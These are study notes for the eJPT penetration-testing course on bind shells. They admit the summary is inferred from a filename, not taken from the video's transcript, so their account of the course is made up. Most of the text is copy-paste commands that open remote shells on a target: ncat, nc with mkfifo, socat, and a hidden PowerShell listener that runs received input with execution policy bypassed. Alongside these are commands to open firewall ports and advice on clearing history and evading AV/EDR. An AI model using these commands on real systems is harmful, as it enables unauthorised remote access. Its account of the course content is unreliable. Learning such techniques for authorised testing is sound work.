# 04 - Bind Shells (eJPT Study Notes)

Note: The transcript is not provided. The following is a conservative, exam-focused summary inferred from the filename and folder context (01-Bind&ReverseShells) and common eJPT curriculum.

## What the video covers (Introduction / big picture)
- What a bind shell is: target (victim) listens on a TCP port and exposes a shell; the attacker connects to it.
- Bind shell vs reverse shell:
  - Bind: inbound connection to target; simpler when inbound ports are reachable (e.g., same LAN, pivot segment).
  - Reverse: outbound from target to attacker; better across NAT/firewalls that block inbound.
- When to use bind shells: internal network, pivot stages, when you can open/listen on a port, or when outbound is blocked.
- Common implementations:
  - Netcat/Ncat on Linux/Windows
  - Socat for stable PTY
  - Workarounds when nc lacks -e
  - PowerShell/Powercat options on Windows
- Stabilizing and upgrading the shell (PTY/TTY fixes).
- Basic firewall considerations.

## Flow (ordered)
1. Pick a TCP port likely allowed (e.g., 443, 53, 8080, or an open internal port).
2. On the target, start a bind listener that executes a shell.
3. Verify/adjust firewall to allow inbound to that port (Linux UFW/iptables or Windows Firewall).
4. From the attacker, connect to the target’s bind port.
5. Confirm command execution.
6. Upgrade the shell (PTY/TTY) for usability.
7. Optional hardening: SSL with Ncat, Socat PTY, rlwrap for history.
8. Post-exploitation steps (enumeration, persistence) as needed.

## Tools highlighted
- Netcat variants:
  - ncat (Nmap’s Ncat; supports -e/--exec and SSL across platforms)
  - nc (OpenBSD/traditional; -e often missing on modern Linux)
- socat (robust, PTY-capable bind shells)
- PowerShell (native Windows option), powercat (if available)
- BusyBox (nc -e support on some embedded targets)
- Shell helpers: python3, mkfifo, bash/sh
- Shell quality: rlwrap, stty

## Typical command walkthrough (detailed, copy-paste friendly)

Linux target (preferred: Ncat with exec):
- Target (listener):
```
ncat -lvnp 4444 -e /bin/bash
```
- Attacker (connect):
```
ncat -nv TARGET_IP 4444
# or
nc -nv TARGET_IP 4444
```

Linux target (nc without -e support – mkfifo workaround):
- Target (listener) – OpenBSD nc style:
```
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 4444 > /tmp/f
```
- Attacker (connect):
```
nc -nv TARGET_IP 4444
```

Linux target (socat with PTY for better interaction):
- Target (listener):
```
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
- Attacker (connect):
```
socat -,rawer,echo=0 TCP:TARGET_IP:4444
# or
nc -nv TARGET_IP 4444
```

Windows target using Ncat (from Nmap):
- Target (listener):
```
ncat.exe -lvnp 4444 -e cmd.exe
```
- Attacker (connect):
```
ncat -nv TARGET_IP 4444
# or
nc -nv TARGET_IP 4444
```

Windows target using PowerShell-only bind (no external binaries):
- Target (listener; run in PowerShell):
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$l=New-Object System.Net.Sockets.TcpListener([Net.IPAddress]::Any,4444);$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($r=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=try{(iex $d 2>&1 | Out-String)}catch{$_|Out-String};$o+='PS '+(pwd).Path+'> ';$ob=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($ob,0,$ob.Length)};$c.Close();$l.Stop()"
```
- Attacker (connect):
```
nc -nv TARGET_IP 4444
```

Optional: Ncat with TLS (both sides must use Ncat and agree on SSL)
- Target (listener with SSL):
```
ncat --ssl -lvnp 4444 --exec /bin/bash
```
- Attacker (connect with SSL):
```
ncat --ssl -nv TARGET_IP 4444
```

Quick shell upgrade (after you connect)
- For Linux shells:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120
```
- If job control needed (from attacker nc):
  - Press Ctrl+Z to background, then:
```
stty raw -echo; fg
reset
export TERM=xterm
stty rows 40 columns 120
```
- For better local line editing:
```
rlwrap nc -nv TARGET_IP 4444
```

Firewall allow (if you have control over the target)
- Linux UFW:
```
sudo ufw allow 4444/tcp
```
- Linux iptables:
```
sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
```
- Windows Defender Firewall:
```
netsh advfirewall firewall add rule name="Bind4444" dir=in action=allow protocol=TCP localport=4444
```

## Practical tips
- NAT and inbound filtering: Bind shells typically fail across NAT/strict perimeter firewalls. Prefer reverse shells over the internet; bind shells shine on flat/internal networks or pivots.
- Port selection: Choose allowed/expected ports (443/53/80/8080) when appropriate; avoid low ports (<1024) without privileges.
- Netcat variant quirks:
  - Many Linux distros ship OpenBSD nc without -e. Use ncat, socat, or mkfifo workaround.
  - BusyBox nc often supports -e and -c.
- Stability: Socat with PTY yields a more interactive shell than nc -e. On the client, rlwrap improves usability.
- Reuse: Ncat’s --keep-open can accept multiple connections on the same listener during testing.
- OPSEC: Clear your FIFO/tmp files and history; prefer ephemeral ports; consider --ssl on internal networks if available.
- Windows AV/EDR: PowerShell listeners may be flagged; ncat.exe from Nmap often works better. Use -NoProfile and -ExecutionPolicy Bypass judiciously in labs.
- Cleanup: Remove firewall rules and temp files (e.g., /tmp/f) after tests.

## Minimal cheat sheet (one-screen flow)

Linux target (Ncat):
```
# Target
ncat -lvnp 4444 -e /bin/bash
# Attacker
nc -nv TARGET 4444
# Upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm; stty rows 40 columns 120
```

Linux target (no -e nc):
```
# Target
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 4444 > /tmp/f
# Attacker
nc -nv TARGET 4444
```

Linux target (socat PTY):
```
# Target
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# Attacker
socat -,rawer,echo=0 TCP:TARGET:4444
```

Windows target (Ncat):
```
# Target
ncat.exe -lvnp 4444 -e cmd.exe
# Attacker
ncat -nv TARGET 4444
```

Optional TLS:
```
# Target
ncat --ssl -lvnp 4444 --exec /bin/bash
# Attacker
ncat --ssl -nv TARGET 4444
```

## Summary
- Bind shells make the target listen for inbound connections, allowing the attacker to connect in and get a shell. They’re straightforward but require inbound reachability to the target host/port.
- Use Ncat or Socat for reliable bind shells; handle nc -e limitations with mkfifo or Socat.
- On Windows, prefer ncat.exe; PowerShell can implement a bind shell if no binaries are available.
- After connecting, upgrade the shell for stable interaction, and be mindful of firewall/NAT constraints.
- In eJPT-style labs, bind shells are especially useful on internal segments and pivots; reverse shells are usually better across perimeter boundaries.